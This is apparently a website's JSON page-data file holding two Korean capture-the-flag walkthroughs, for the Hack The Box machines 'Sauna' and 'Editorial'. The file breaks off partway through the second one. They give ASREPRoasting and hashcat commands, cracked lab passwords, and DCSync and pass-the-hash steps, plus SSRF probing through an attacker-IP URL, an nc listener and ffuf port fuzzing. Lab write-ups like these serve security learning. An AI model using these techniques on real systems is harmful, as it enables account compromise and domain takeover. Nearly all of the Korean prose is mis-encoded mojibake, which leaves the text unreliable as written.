{"componentChunkName":"component---src-pages-search-jsx","path":"/search/","result":{"data":{"allMarkdownRemark":{"nodes":[{"excerpt":"Sauna ìš”ì•½  ğŸŒŸ í•œ ì¤„ í‰ ì•¡í‹°ë¸Œ ë””ë ‰í† ë¦¬ì˜ ê¸°ë³¸ì ì¸ ê³µê²© ìš”ì†Œ ë° ì •ë³´ ìˆ˜ì§‘ ë°©ë²•ë“¤ì„ ê²½í—˜í•  ìˆ˜ ìˆëŠ” ì‹œìŠ¤í…œì¸ë°, ì˜ ë§Œë“¤ì—ˆë‹¤ê³  ì†Œë¬¸ë‚œ Pro Labsì˜ Danteë¥¼ ë§Œë“  ì œì‘ì (egotisticalSW)ê°€ ë§Œë“  ì‹œìŠ¤í…œì´ë¼ ê·¸ëŸ°ì§€ í•µë”ë°•ìŠ¤ë‚´ì—ì„œë„ ì¸ê¸°ê°€ ë†’ë‹¤.  ì‚¬ìš°ë‚˜ëŠ” Active Directory ì—´ê±° ë° í™œìš© ê¸°ëŠ¥ì„ ê°–ì¶˜ ì‰¬ìš´ ë‚œì´ë„ì˜ ìœˆë„â€¦","fields":{"slug":"/Sauna/"},"frontmatter":{"date":"February 09, 2025","title":"Sauna","tags":["HTB","ASREPRoasting","PtH","DCSync","ìœˆë„ìš°ì¦ˆ"]},"rawMarkdownBody":"\n## Sauna ìš”ì•½\n![](https://velog.velcdn.com/images/h3llanut3lla/post/4a06e187-1d98-4268-9540-f1c4a459e2df/image.png)\n\n> ğŸŒŸ **í•œ ì¤„ í‰**\n>\n> ì•¡í‹°ë¸Œ ë””ë ‰í† ë¦¬ì˜ ê¸°ë³¸ì ì¸ ê³µê²© ìš”ì†Œ ë° ì •ë³´ ìˆ˜ì§‘ ë°©ë²•ë“¤ì„ ê²½í—˜í•  ìˆ˜ ìˆëŠ” ì‹œìŠ¤í…œì¸ë°, ì˜ ë§Œë“¤ì—ˆë‹¤ê³  ì†Œë¬¸ë‚œ Pro Labsì˜ Danteë¥¼ ë§Œë“  ì œì‘ì (egotisticalSW)ê°€ ë§Œë“  ì‹œìŠ¤í…œì´ë¼ ê·¸ëŸ°ì§€ í•µë”ë°•ìŠ¤ë‚´ì—ì„œë„ ì¸ê¸°ê°€ ë†’ë‹¤. \n\nì‚¬ìš°ë‚˜ëŠ” Active Directory ì—´ê±° ë° í™œìš© ê¸°ëŠ¥ì„ ê°–ì¶˜ ì‰¬ìš´ ë‚œì´ë„ì˜ ìœˆë„ìš°ì¦ˆ ì‹œìŠ¤í…œì´ë‹¤. \n\nì›¹ì‚¬ì´íŠ¸ì— ë‚˜ì™€ ìˆëŠ” ì§ì› ì´ë¦„ì„ í™œìš©í•˜ì—¬ ì‚¬ìš©ì ì´ë¦„ ë¦¬ìŠ¤íŠ¸ë¥¼ ë§Œë“¤ì–´ ASREPRoasting ê³µê²©ì— ì‚¬ìš©í•˜ë©´ ì»¬ë¸Œë¡œìŠ¤ ì‚¬ì „ ì¸ì¦ (Kerberos pre-authentication)ì´ í•„ìš”í•˜ì§€ ì•Šì€ ê³„ì •ì— ëŒ€í•œ í•´ì‹œë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤. ì´ í•´ì‹œë¥¼ ì´ìš©í•˜ì—¬ ì˜¤í”„ë¼ì¸ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²© (Offline brute force attack)ì„ ìˆ˜í–‰ í•˜ê²Œ ë˜ë©´ WinRMì„ ì‹¤í–‰ í•  ìˆ˜ ìˆëŠ” ì‚¬ìš©ì ê³„ì •ì˜ ì¼ë°˜ í…ìŠ¤íŠ¸ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤. \n\nê¶Œí•œìƒìŠ¹ì„ ìœ„í•œ ì •ë³´ ìˆ˜ì§‘ìœ¼ë¡œ WinPEASë¥¼ ì‹¤í–‰í•˜ë©´ ë‹¤ë¥¸ ì‹œìŠ¤í…œ ì‚¬ìš©ìê°€ ìë™ ë¡œê·¸ì¸ ì„¤ì •ì„ í•´ë‘ì—ˆë‹¤ëŠ” ì‚¬ì‹¤ê³¼ ë¹„ë°€ë²ˆí˜¸ë¥¼ í•¨ê»˜ í™•ì¸ í•  ìˆ˜ ìˆë‹¤. ë¸”ëŸ¬ë“œí•˜ìš´ë“œ (BloodHound)ë¥¼ ì´ìš©í•˜ë©´ ì´ ì‚¬ìš©ìì—ê²ŒëŠ” ë””ì”¨ì”½í¬ (DCSync) ê³µê²© ì‹œ ë„ë©”ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ì—ì„œ ì•”í˜¸ í•´ì‹œë¥¼ ë¤í”„í•  ìˆ˜ ìˆëŠ” `DS-Replication-Get-Changes-All` í™•ì¥ ê¶Œí•œì´ ìˆë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤. ì´ ê³µê²©ì„ ì‹¤í–‰í•˜ë©´ ì£¼ ë„ë©”ì¸ ê´€ë¦¬ìì˜ í•´ì‰¬ë¥¼ ì–»ì„ ìˆ˜ ìˆìœ¼ë©° ì´ëŠ” ì„íŒ¨í‚· (Impacket)ì˜ í”¼ì—ìŠ¤ì´ê·¸ì  (psexec.py)ê³¼ í•¨ê»˜ ì‚¬ìš©í•¨ìœ¼ë¡œì¨ ìƒìŠ¹ëœ ê¶Œí•œì¸ `NT_AUTHORITY\\SYSTEM` ìœ¼ë¡œì¨ ì‰˜ì„ ì—´ ìˆ˜ ìˆë‹¤. \n\n## ì •ë³´ ìˆ˜ì§‘\n### Nmap í¬íŠ¸ ìŠ¤ìº”\n```sh\nPORT      STATE SERVICE                    \n53/tcp    open  domain \n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds                          \n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP              \n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49667/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n49671/tcp open  unknown\n49681/tcp open  unknown\n64471/tcp open  unknown\n```\n- ë””ë ‰í† ë¦¬ í¼ì§• (Directory Fuzzing) ì—ì„œëŠ” ë”±íˆ ëˆˆì— ë„ëŠ” í´ë”ëŠ” ì—†ì—ˆë‹¤. \n- LDAPì„ ì—´ê±°í•˜ë©´ ë„ë©”ì¸ëª… `egotistical-bank.local` ì„ í™•ì¸ í•  ìˆ˜ ìˆë‹¤. \n\n### 80-HTTP\n`http://egotistical-bank.local/about.html` ë¡œ ì ‘ì†í•˜ë©´ ì§ì›ë“¤ì˜ ì´ë¦„ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/be597dbd-270e-439f-9379-9d46daf99b85/image.png)\n\n### ìœ ì €ë„¤ì„ ì–»ê¸°\në‚˜ì¤‘ì— ì°¾ì•„ë³´ë‹ˆ [Kerbrute](https://github.com/ropnop/kerbrute)ë¥¼ í™œìš©í•´ ì¢€ ë” ê°„ê²°í•˜ê³  ìŠ¤ë§ˆíŠ¸í•˜ê²Œ ì‚¬ìš©ìëª…ì„ ì–»ëŠ” ë°©ë²•ì´ ìˆìœ¼ë‚˜ ë‚˜ëŠ” ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ ì–»ì—ˆë‹¤.\n\n>Kerbruteë¥¼ í™œìš©í•˜ëŠ” ë°©ë²•ì€ [ì´ ë¬¸ì œí’€ì´](https://0xdf.gitlab.io/2020/07/18/htb-sauna.html#recon) ì°¸ì¡°. \n\n[Username anarchy](https://github.com/urbanadventurer/username-anarchy)ë¥¼ ì´ìš©í•˜ì—¬ ì§ì›ë“¤ì˜ í’€ë„¤ì„ì„ ë„£ìœ¼ë©´ ê·¸ê±¸ ì¹˜í™˜í•´ ìœ ì €ë„¤ì„ í˜•ì‹ìœ¼ë¡œ ë°”ê¿”ì£¼ëŠ”ë° ë‹¤ì–‘í•œ í˜•ì‹ì˜ ìœ ì €ë„¤ì„ ë¦¬ìŠ¤íŠ¸ë¥¼ ASREPRoasting ê³µê²©ì— ë„£ì–´ ì–»ì–´ ê±¸ë¦¬ê¸¸ ê¸°ë„í•˜ëŠ” ë°©ë²•ì´ë‹¤. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/88c244c4-5d61-4be2-8646-8c54a7caf1cc/image.png)\n\n## ASREPRoasting / í•´ì‹œ ì–»ê¸°\n### ASREPRoating ê°œë…\nêµ¬ê¸€ë§ì„ í•˜ë‹¤ë³´ë©´ ê¸€ì´ ê¸¸ê³  ì„¤ëª…ì´ ë³µì¡í•œê²ƒë“¤ì´ ëŒ€ë¶€ë¶„ì¸ë°, [ì´ í¬ìŠ¤íŠ¸](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting)ê°€ ê°„ê²°í•˜ê³  ì‰½ê²Œ ì˜ ì„¤ëª…í•œ ê²ƒ ê°™ë‹¤. \n\nìœ„ í¬ìŠ¤íŠ¸ë¥¼ ìš”ì•½í•˜ìë©´, \n- ì‚¬ì „ ì¸ì¦ì€ Kerberos ì¸ì¦ì˜ ì²« ë²ˆì§¸ ë‹¨ê³„ì´ë©° ì£¼ìš” ì—­í• ì€ ë¬´ì°¨ë³„ ì•”í˜¸ ì¶”ì¸¡ ê³µê²©ì„ ë°©ì§€í•˜ëŠ” ê²ƒì„. \n- ì‚¬ì „ ì¸ì¦ ì ˆì°¨ ì¤‘, ì‚¬ìš©ìëŠ” íƒ€ì„ìŠ¤íƒ¬í”„ë¥¼ ì•”í˜¸í™”í•˜ëŠ”ë° ì‚¬ìš©í•  ìê²©ì¦ëª…ì„ ì…ë ¥í•¨. \n- DCëŠ” ì´ë¥¼ í•´ë…í•˜ì—¬ ì˜¬ë°”ë¥¸ ìê²© ì¦ëª…ì´ ì‚¬ìš©ë˜ì—ˆëŠ”ì§€ í™•ì¸í•¨. \n- DCê°€ ìŠ¹ì¸í•˜ë©´ TGTë¥¼ ë°œí–‰.\n- ì‚¬ì „ ì¸ì¦ì´ ë¹„í™œì„±í™”ë˜ë©´ ê³µê²©ìê°€ _ëª¨ë“  _ì‚¬ìš©ìì— ëŒ€í•œ í‹°ì¼“ì„ ìš”ì²­í•  ìˆ˜ ìˆìŒ.\n- ë”°ë¼ì„œ ëª…ì‹œì ìœ¼ë¡œ ê³„ì •ì— `DONT_REQ_PREAUTH` (ì‚¬ì „ ì¸ì¦ ë¹„í™œì„±í™”) ë¼ëŠ” ì„¤ì •ì´ ìˆì–´ì•¼ ê°€ëŠ¥í•œ ê³µê²©ì„. \n- ê·¸ëŸ¼ DCëŠ” ì˜¤í”„ë¼ì¸ì—ì„œ í¬ë™í•  ìˆ˜ ìˆëŠ” Kerberoast ê³µê²©ê³¼ ìœ ì‚¬í•˜ê²Œ ì•”í˜¸í™”ëœ TGTë¥¼ ë°˜í™˜í•¨. \n\nìš°ì„  ì»¬ë¸Œë¡œìŠ¤ 88ë²ˆ í¬íŠ¸ê°€ ì—´ë ¤ ìˆê³ , ìœˆë„ìš°ì¦ˆ ì‹œìŠ¤í…œì´ê³ , ì‚¬ì „ì¸ì¦ì´ ë¹„í™œì„±í™”ëœ ê³„ì •ì´ ìˆë‹¤ë©´ ì‹œë„í•´ë³¼ë§Œ í•œ ê³µê²©ì¸ ê²ƒ ê°™ë‹¤. \n\n### ASREPRoasting ì‹œë„\nì•„ë˜ì˜ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•´ ìœ„ì—ì„œ ë§Œë“  ìœ ì €ë„¤ì„ ë¦¬ìŠ¤íŠ¸ë¥¼ ë„£ì–´ Impacketì˜ GetNPUsersë¥¼ ì‚¬ìš©í•´ ASREPRoasting ê³µê²©ì„ ì‹¤í–‰, ì•„ì›ƒí’‹ìœ¼ë¡œ ë‚˜ì˜¨ í•´ì‹œë¥¼ `hash.txt` íŒŒì¼ì— ì €ì¥í•œë‹¤. \n\n```sh\nwhile read p; do impacket-GetNPUsers egotistical-bank.local/\"$p\" -request -no-pass -dc-ip 10.10.10.175 >> hash.txt; done < unames.txt\n```\n\nê·¸ëŸ¬ë©´ ì•„ë˜ì™€ ê°™ì´ `fsmith` ì‚¬ìš©ìì˜ ì»¬ë¸Œë¡œìŠ¤ í•´ì‰¬ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/55f4b870-d498-48b7-969a-6d4cd964d98a/image.png)\n\nì¼ë°˜ í…ìŠ¤íŠ¸ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì–»ê¸° ìœ„í•´ í•´ì‰¬ìº£ì„ ì´ìš©í•´ ë¬´ì°¨ë³„ ëŒ€ì…ì„ í•˜ë©´ ëœë‹¤. \n\n```sh\nhashcat -m 18200 fsmithhash /usr/share/wordlists/rockyou.txt --force\n```\n\ní•´ì‰¬ìº£ ëª¨ë“œëŠ” `hashcat --help | grep Kerberos`ë¥¼ ì…ë ¥í•´, `AS-REP` ì´ë¼ê³  ì íŒ ëª¨ë“œ ë²ˆí˜¸ë¥¼ ì‚¬ìš©í•œë‹¤. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/78b5413e-a491-483c-8936-f1744512efba/image.png)\n\nê·¸ëŸ¬ë©´ ì´ë ‡ê²Œ í¬ë™ëœ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤. \n\n- ìœ ì €ë„¤ì„: `fsmith`\n- ë¹„ë°€ë²ˆí˜¸: `Thestrokes23`\n\n\n## ì´ˆì…\nEvil-WinRMì„ ì´ìš©í•˜ì—¬ ìƒˆë¡œ ì–»ì€ ë¡œê·¸ì¸ ìê²©ì¦ëª…ì„ ë„£ìœ¼ë©´ ì´ˆì…ì— ì„±ê³µí•  ìˆ˜ ìˆë‹¤. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/43b2d8fa-fe29-411c-97df-7fd457d3aebf/image.png)\n\n## ê¶Œí•œìƒìŠ¹\n### ì •ë³´ ìˆ˜ì§‘\n[WinPEAS](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)ë¥¼ ì‹¤í–‰í•˜ë©´ ì•„ë˜ì™€ ê°™ì´ ìë™ë¡œê·¸ì¸ì´ í™œì„±í™”ëœ ê³„ì •ì •ë³´ë¥¼ ë¹„ë°€ë²ˆí˜¸ì™€ í•¨ê»˜ ì–»ì„ ìˆ˜ ìˆë‹¤. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/7143ac67-0377-4a57-b206-1d392687d4c0/image.png)\n\n- ìœ ì €ë„¤ì„: `svc_loanmanager`\n- ë¹„ë°€ë²ˆí˜¸: `Moneymakestheworldgoround!`\n\n### ì‹œë„ \nì´ˆì… ë°©ì‹ì™€ ê°™ì´ ìƒˆë¡œ ì–»ì€ ìê²©ì¦ëª…ì„ í™œìš©í•´ Evil WinRMì„ í†µí•´ ì—°ê²°í•´ë³´ì. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/779305e0-89f4-430f-a9bf-9435496ee062/image.png)\n\n## ë¸”ëŸ¬ë“œí•˜ìš´ë“œ (BloodHound)\n[ë¸”ëŸ¬ë“œí•˜ìš´ë“œ](https://github.com/SpecterOps/BloodHound-Legacy)ë¥¼ ì‚¬ìš©í•˜ë©´ ì•¡í‹°ë¸Œë””ë ‰í† ë¦¬ ë„ë©”ì¸ ì—´ê±° ë° ì‹œê°í™”ë¥¼ í•  ìˆ˜ ìˆëŠ”ë° ê¶Œí•œìƒìŠ¹ì„ ìœ„í•œ ì •ë³´ ìˆ˜ì§‘ì‹œ ê°€ì´ë“œ ì—­í• ì„ í•´ì£¼ëŠ” ì•„ì£¼ ìœ ìš©í•œ íˆ´ì´ë‹¤. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/ee48adf9-5457-41dc-af91-e94e39c5235f/image.png)\n\n`Queries` íƒ­ì—ì„œ `Find Principals with DCSync Rights` ë¥¼ í´ë¦­í•˜ë©´ í˜„ ì‚¬ìš©ìê°€ `GetChangesAll`ì„ í†µí•´ ë„ë©”ì¸ê³¼ ì—°ê²°ì´ ëœ ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.\n\nê°€ì¥ìë¦¬ë¥¼ ìš°í´ë¦­í•˜ê³  `Help`ë¥¼ í´ë¦­í•˜ë©´ svc_loanmgr(í˜„ ì‚¬ìš©ì)ê°€ DCSync ê³µê²©ì„ ì‚¬ìš©í•˜ì—¬ ë„ë©”ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ì—ì„œ ë¹„ë°€ë²ˆí˜¸ í•´ì‹œë¥¼ ë¤í”„í•  ìˆ˜ ìˆìŒì„ ì•Œ ìˆ˜ ìˆë‹¤.\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/63046407-49dc-4d39-828d-1a0461df8a88/image.png)\n\n## ë””ì”¨ì”½í¬ (DCSync)\n![](https://velog.velcdn.com/images/h3llanut3lla/post/8682c72b-2a15-43ad-984b-c520fd415b15/image.png)\n\nì´ë ‡ê²Œ í•˜ë©´ ê´€ë¦¬ìì˜ í•´ì‰¬ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤. \nì´ ë°©ë²• ì™¸ì—ë„ ë¯¸ë¯¸ì¼“ì¦ˆ (Mimikatz)ë¥¼ íƒ€ê²Ÿì—ì„œ ì‹¤í–‰í•´ ê´€ë¦¬ì í•´ì‰¬ë¥¼ ì–»ëŠ” ë°©ë²•, ë””ì”¨ì”½í¬ë¥¼ í†µí•´ ì–»ì€ í•´ì‰¬ë¥¼ Evil-WinRMì— ê·¸ëŒ€ë¡œ ë„£ì–´ ê´€ë¦¬ìë¡œì¨ ì—°ê²°í•˜ëŠ” ë°©ë²•ì´ ìˆë‹¤ê³  í•œë‹¤. \n\n## íŒ¨ìŠ¤ë”í•´ì‹œ (PtH)\në‚˜ëŠ” í•´ì‰¬ë¥¼ ì„íŒ¨ì¼“ (Impacket) í”¼ì—ìŠ¤ì´ê·¸ì  (psexec.py)ì— ë„£ì–´ íŒ¨ìŠ¤í•˜ëŠ” ë°©ë²•ì„ íƒí–ˆë‹¤. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/bb50f669-d675-4dc1-b889-b7e982d0b215/image.png)\n"},{"excerpt":"Editorial ìš”ì•½  ğŸŒŸ í•œ ì¤„ í‰\në¹„ìŠ·í•œ ë°©ì‹ì˜ í…Œí¬ë‹‰ì´ ì—¬ëŸ¬ë²ˆ ë°˜ë³µë˜ëŠ” ëŠë‚Œì´ ìˆìœ¼ë‚˜, SSRFë¥¼ ì—°ìŠµí•˜ê¸°ì— ì¢‹ì•˜ê³  ì´ˆì…ê¹Œì§€ ê°€ëŠ” ê³¼ì •ì´ ë‹¤ë¥¸ ì‰¬ìš´ ë ˆë²¨ì˜ ì‹œìŠ¤í…œë³´ë‹¤ ë³µì¡í•´ ì¢€ ë” í˜„ì‹¤ì ì´ë¼ëŠ” ëŠë‚Œì„ ë°›ì•˜ë‹¤.  'Editorial'ì€ 'Server-Side Request Forgery(SSRF)'ì— ì·¨ì•½í•œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ê°–ì¶˜ ì‰¬ìš´ ë‚œì´ë„ì˜ ë¦¬ëˆ…â€¦","fields":{"slug":"/Editorial/"},"frontmatter":{"date":"February 08, 2025","title":"Editorial","tags":["HTB","SSRF","git","sudo-l","SSH","ë¦¬ëˆ…ìŠ¤"]},"rawMarkdownBody":"## Editorial ìš”ì•½\n![](https://velog.velcdn.com/images/h3llanut3lla/post/fbaf8181-884b-4302-994a-4f0b91a51d79/image.png)\n\n> ğŸŒŸ **í•œ ì¤„ í‰**\n> ë¹„ìŠ·í•œ ë°©ì‹ì˜ í…Œí¬ë‹‰ì´ ì—¬ëŸ¬ë²ˆ ë°˜ë³µë˜ëŠ” ëŠë‚Œì´ ìˆìœ¼ë‚˜, SSRFë¥¼ ì—°ìŠµí•˜ê¸°ì— ì¢‹ì•˜ê³  ì´ˆì…ê¹Œì§€ ê°€ëŠ” ê³¼ì •ì´ ë‹¤ë¥¸ ì‰¬ìš´ ë ˆë²¨ì˜ ì‹œìŠ¤í…œë³´ë‹¤ ë³µì¡í•´ ì¢€ ë” í˜„ì‹¤ì ì´ë¼ëŠ” ëŠë‚Œì„ ë°›ì•˜ë‹¤. \n\n'Editorial'ì€ 'Server-Side Request Forgery(SSRF)'ì— ì·¨ì•½í•œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ê°–ì¶˜ ì‰¬ìš´ ë‚œì´ë„ì˜ ë¦¬ëˆ…ìŠ¤ ì‹œìŠ¤í…œì´ë‹¤. ì´ ì·¨ì•½ì ì€ ë‚´ë¶€ì—ì„œ ì‹¤í–‰ë˜ëŠ” APIì˜  ë¡œê·¸ì¸ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ì–»ê¸° ìœ„í•´ í™œìš©ë˜ë©°, ì´ëŠ” 'SSH' ì•¡ì„¸ìŠ¤ë¡œ ì´ì–´ì§€ëŠ” ë¡œê·¸ì¸ ìê²© ì¦ëª…ì„ ì–»ê¸° ìœ„í•´ í™œìš©ëœë‹¤. ì‹œìŠ¤í…œì—ì„œ ì •ë³´ìˆ˜ì§‘ì„ í•˜ë‹¤ë³´ë©´ ìƒˆë¡œìš´ ì‚¬ìš©ìì˜ ë¡œê·¸ì¸ ìê²©ì¦ëª…ì„ ê¹ƒ 'Git' ë¦¬í¬ì§€í† ë¦¬ì—ì„œ ì°¾ì„ ìˆ˜ ìˆë‹¤. 'root' ì‚¬ìš©ìëŠ” [CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439) ë° `sudo` êµ¬ì„±ì„ í™œìš©í•˜ì—¬ ì–»ì„ ìˆ˜ ìˆë‹¤.\n\n## ì •ë³´ìˆ˜ì§‘\n### Nmap í¬íŠ¸ ìŠ¤ìº”\n```sh\nPORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=\n|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx\n80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://editorial.htb\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n```\nTCPë¡œëŠ” SSHì™€ HTTPë§Œ ì—´ë ¤ ìˆë‹¤. \nSSHëŠ” ë¡œê·¸ì¸ ìê²©ì¦ëª…ì´ í•„ìš”í•˜ê¸° ë•Œë¬¸ì— HTTPë¶€í„° ì‚´í´ë³´ì. \n\n### 80-HTTP\n![](https://velog.velcdn.com/images/h3llanut3lla/post/a31f6fae-0874-41eb-ab2b-ab3a71f59169/image.png)\n\nì›¹ì‚¬ì´íŠ¸ëŠ” ì´ë ‡ê²Œ ìƒê²¼ê³ , í•œëˆˆì— ë³´ê¸°ì— ì·¨ì•½í•œ ë¶€ë¶„ì€ ìš°ì¸µ ìƒë‹¨ì˜ ì„œì¹˜ë°” ì •ë„ì´ì§€ë§Œ, ê°„ë‹¨í•œ SQL Injection í…ŒìŠ¤íŠ¸í›„ ì·¨ì•½ì ì„ ë°œê²¬í•˜ì§€ ëª»í•´ ì •ë³´ë¥¼ ë” ìˆ˜ì§‘í•´ë³´ì. \n\n#### ë””ë ‰í† ë¦¬ í¼ì§• (Directory Fuzzing)\n![](https://velog.velcdn.com/images/h3llanut3lla/post/59c0075b-62ad-4064-8b2d-b9d624c3bda7/image.png)\n\n`/upload` ì™€ `/about` ë””ë ‰í† ë¦¬ë¥¼ ì°¾ì•˜ë‹¤. \n\n`/upload` ì— ì ‘ì†í•´ë³´ì. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/f9f0b9c1-ca80-4254-8778-5319d945563c/image.png)\n\nìƒë‹¨ Book Information ì•„ë˜ ì¢Œì¸¡ `Cover URL related to your book or` ë€ì— ê³µê²©ì IPë¥¼ ì•„ë˜ì™€ ê°™ì´ ì ê³  \n\n```sh\nhttp://ê³µê²©ìIP/test\n```\n\në„·ìº£ ë¦¬ìŠ¤í„° (netcat listener)ë¥¼ ì—´ì–´ë‘” ìƒíƒœì—ì„œ \n\n```sh\nnc -lvnp 80\n```\n`Preview` ë²„íŠ¼ì„ ëˆ„ë¥´ë©´ HTTP ë¦¬í€˜ìŠ¤íŠ¸ê°€ ë“¤ì–´ì˜¨ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤ (ìº¡ì³ ìƒëµ). ì´ê²ƒì€ ì´ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ Server-side request forgery (SSRF)ì— ì·¨ì•½í•˜ë‹¤ëŠ”ê²ƒì„ ì˜ë¯¸í•œë‹¤. \n\nBurp Suiteì˜ Repeaterë¥¼ ì´ìš©í•´ë³´ì. \n`bookurl` ê°’ì— ë¡œì»¬ IPì£¼ì†Œë¥¼ ì…ë ¥í•˜ë©´ jpeg ì´ë¯¸ì§€ê°€ ë¦¬ìŠ¤í€ìŠ¤ë¡œ ëŒì•„ì˜¨ë‹¤. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/0759040b-bcaf-444e-aaa9-3c61aca23e49/image.png)\n\n#### í¬íŠ¸ í¼ì§• (Port Fuzzing)\nì´ì œ ë‚´ë¶€ì˜ í˜¸ìŠ¤íŒ…ëœ ì„œë¹„ìŠ¤ë¥¼ ì°¾ê¸° ìœ„í•´ í¬íŠ¸ í¼ì§•ì„ í•´ë³´ì. ì°¾ì•„ë³´ë‹ˆ Burp Suiteì˜ Intruderë¥¼ ì´ìš©í•˜ëŠ” ë°©ë²•ì´ ìˆëŠ” ê²ƒ ê°™ì€ë° ë‚˜ëŠ” ffufë¥¼ ì‚¬ìš©í•˜ì—¬ í¼ì§•í•˜ëŠ” ë°©ë²•ì„ íƒí–ˆë‹¤. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/7fd3d79d-66ca-45e5-be2b-219d1de9758c/image.png)\n\nBurp Suite ì˜ Proxy ëª¨ë“œì—ì„œ Interceptë¥¼ í´ë¦­í•´ ë¦¬í€˜ìŠ¤íŠ¸ë¥¼ ì„ íƒí•´ì£¼ê³  \n`http://127.0.0.1:FUZZ` ë¼ê³  ì…ë ¥í•œ í›„, ìš°í´ë¦­ -> `Copy to file` -> `req.txt` ë¼ëŠ” íŒŒì¼ëª…ìœ¼ë¡œ ìˆ˜ì •ëœ HTTP ë¦¬í€˜ìŠ¤íŠ¸ íŒŒì¼ì„ ì €ì¥í•´ì¤€ë‹¤. \n\nê·¸ë¦¬ê³  ì•„ë˜ì˜ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•´ í¬íŠ¸ í¼ì§•ì„ í•´ì¤€ë‹¤. \n```sh\nffuf -u http://editorial.htb/upload-cover -X POST -request req.txt -w ports.txt -fs 61\n```\n![](https://velog.velcdn.com/images/h3llanut3lla/post/f4cff494-ae9a-4430-8356-c0fbf78fbf5a/image.png)\n\n5000 ì„ ì°¾ì•˜ë‹¤. \n\nê·¸ëŸ¼ ì´ì œ ë‹¤ì‹œ ê¸°ì¡´ì˜ Burp Suite Repeaterë¡œ ëŒì•„ê°€ì„œ ìƒˆë¡œ ì°¾ì€ í¬íŠ¸ë²ˆí˜¸ë¥¼ ë¡œì»¬IPì— ì¶”ê°€í•´ì£¼ë©´ \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/85014a6b-415e-4ceb-8366-10dd8ccaa9e9/image.png)\n\nìš°ì¸¡ê³¼ ê°™ì´ ìƒˆë¡œìš´ ë””ë ‰í† ë¦¬ê°€ ë¦¬ìŠ¤í€ìŠ¤ë¡œ ëŒì•„ë³´ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. \nìƒˆë¡œìš´ ë””ë ‰í† ë¦¬ë¡œ ê°€ë³´ë©´ ì €ì ˆë¡œ íŒŒì¼ì´ ë‹¤ìš´ë¡œë“œ ë˜ëŠ”ë° íŒŒì¼ì„ ì—´ì–´ë³´ë©´ ì•„ë˜ì™€ ê°™ë‹¤. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/6b33ce2c-09ed-41f1-b8f6-75fc553f591a/image.png)\n\nì´ê±¸ ì½ê¸° ì‰½ê²Œ jsonìœ¼ë¡œ í¬ë§¤íŒ… í•´ë³´ì. \n\n```json\n{\n  \"messages\": [\n    {\n      \"promotions\": {\n        \"description\": \"Retrieve a list of all the promotions in our library.\",\n        \"endpoint\": \"/api/latest/metadata/messages/promos\",\n        \"methods\": \"GET\"\n      }\n    },\n    {\n      \"coupons\": {\n        \"description\": \"Retrieve the list of coupons to use in our library.\",\n        \"endpoint\": \"/api/latest/metadata/messages/coupons\",\n        